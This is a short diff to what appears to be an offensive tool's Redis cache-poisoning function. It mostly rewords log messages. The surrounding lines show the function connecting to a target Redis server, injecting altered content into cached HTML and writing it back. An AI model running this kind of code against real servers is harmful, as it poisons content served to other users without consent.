@@ -117,7 +117,7 @@ def action_redis_cache_poison(config):
 	"""
 	Dump all redis information
 	"""
-	log.error("Trying to connect with redis server...")
+	log.warning("  - Trying to connect with redis server...")
 
 	# Connection with redis
 	con = redis.StrictRedis(host=config.target, port=config.port, db=config.db)
@@ -164,17 +164,20 @@ def action_redis_cache_poison(config):
 		try:
 			modified = handle_html(config, content)
 		except ValueError as e:
-			log.error("Can't modify cache content: " % e)
+			log.error("  - Can't modify cache content: " % e)
 			continue
 		except IOError as e:
-			log.error("Can't modify cache content: " % e)
+			log.error("  - Can't modify cache content: " % e)
 
 		# Injection was successful?
 		if modified is None:
-			log.warning("Can't modify content: ensure that content is HTML")
+			log.warning("  - Can't modify content: ensure that content is HTML")
 			continue
 
 		# Set injection into server
 		con.setex(val, 200, modified)
 
+		log.error("  - Poisoned cache key '%s' at '%s'" % (val, config.target))
 
+	if not cache_keys:
+		log.error("  - No cache keys found in server: Can't poison remote cache.")
